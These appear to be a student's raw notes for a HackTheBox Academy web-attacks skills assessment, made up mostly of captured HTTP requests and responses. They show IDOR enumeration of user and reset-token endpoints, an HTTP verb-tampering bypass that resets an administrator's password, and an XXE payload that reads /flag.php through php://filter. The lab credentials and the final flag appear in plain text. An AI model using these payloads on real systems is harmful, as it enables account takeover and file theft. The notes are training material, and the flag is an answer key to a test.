# Skills assessment - Web Attacks

## Normal requests

83.136.253.251:51525

htb-student
Academy_student!

POST /index.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://94.237.62.195:53851
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:53851/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj
Connection: close

username=htb-student&password=Academy_student%21

GET /profile.php HTTP/1.1
Host: 94.237.62.195:53851
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:53851/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

GET /api.php/user/74 HTTP/1.1
Host: 94.237.62.195:53851
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.62.195:53851/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

GET /settings.php HTTP/1.1
Host: 94.237.62.195:53851
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:53851/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

GET /api.php/token/74 HTTP/1.1
Host: 94.237.62.195:53851
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

POST /reset.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=Academy_student!


## HTTP Verb Tampering

§GET§ /profile.php HTTP/1.1
PUT
POST
DELETE

--> Code 200

GET /api.php/user/75 HTTP/1.1
Host: 94.237.62.195:53851
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.62.195:53851/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=74
Connection: close

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 21:19:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 102
Connection: close
Content-Type: text/html; charset=UTF-8

{"uid":"75","username":"h.ray","full_name":"Harrison Ray","company":"Satterfield, Schultz and Kemmer"}

--> OK from 1 to 100

PUT /api.php/user/75 HTTP/1.1
POST /api.php/user/75 HTTP/1.1
DELETE /api.php/user/75 HTTP/1.1

--> OK but no data returned

POST /reset.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=75
Connection: close

uid=75&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=Academy_student!

--> Access Denied

GET /api.php/token/75 HTTP/1.1
Host: 94.237.62.195:53851
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=75
Connection: close

--> OK

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 21:36:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 48
Connection: close
Content-Type: text/html; charset=UTF-8

{"token":"e51a8a3c-17ac-11ec-8e68-7fe51c0c175e"}

POST /reset.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=75
Connection: close

uid=75&token=e51a8a3c-17ac-11ec-8e68-7fe51c0c175e&password=Academy_student!

--> Access Denied


{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}

GET /api.php/token/52 HTTP/1.1
Host: 94.237.62.195:53851
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: */*
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=52
Connection: close

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 21:55:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 48
Connection: close
Content-Type: text/html; charset=UTF-8

--> OK 

{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}

POST /reset.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=75
Connection: close

uid=75&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=Academy_student!

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 21:56:29 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 13
Connection: close
Content-Type: text/html; charset=UTF-8

Access Denied

GET /reset.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=52
Connection: close

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=Academy_student!

--> Missing parameters

GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=Academy_student! HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=52
Connection: close

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=Academy_student!

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 22:09:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 29
Connection: close
Content-Type: text/html; charset=UTF-8

Password changed successfully

--> OK

Authentication with :

a.corrales
Academy_student!

--> OK

POST /addEvent.php HTTP/1.1
Host: 94.237.62.195:53851
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://94.237.62.195:53851
Referer: http://94.237.62.195:53851/event.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=jtagso9qrfk4hj4uh39i0o2qpj; uid=52
Connection: close


            <root>
            <name>a</name>
            <details>b</details>
            <date>2010-10-10</date>
            </root>
            

HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 22:12:16 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

Event 'a' has been created.



<!DOCTYPE name [
  <!ENTITY company "Inlane Freight">
]>
            <root>
            <name>&company;</name>
            <details>b</details>
            <date>2010-10-10</date>
            </root>

Event 'Inlane Freight' has been created.

<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>

            <root>
            <name>&company;</name>
            <details>b</details>
            <date>

Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.

echo -n 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d 

<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
